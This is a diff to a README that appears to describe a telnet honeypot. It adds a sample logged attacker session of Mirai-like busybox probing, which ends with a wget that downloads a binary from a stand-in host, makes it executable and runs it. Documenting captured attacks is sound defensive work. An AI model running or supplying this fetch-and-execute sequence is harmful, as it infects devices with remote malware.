@@ -17,6 +17,18 @@ SQLite database.
 All binaries are also uploaded to virustotal.com, if not
 already present.
 
+## Sample Connection
+
+	enable
+	shell
+	sh
+	cat /proc/mounts; /bin/busybox PEGOK
+	cd /tmp; (cat .s || cp /bin/echo .s); /bin/busybox PEGOK
+	nc; wget; /bin/busybox PEGOK
+	(dd bs=52 count=1 if=.s || cat .s)
+	/bin/busybox PEGOK
+	rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit 
+
 ## Images
 
 ![Screenshot 1](images/screen1.png)
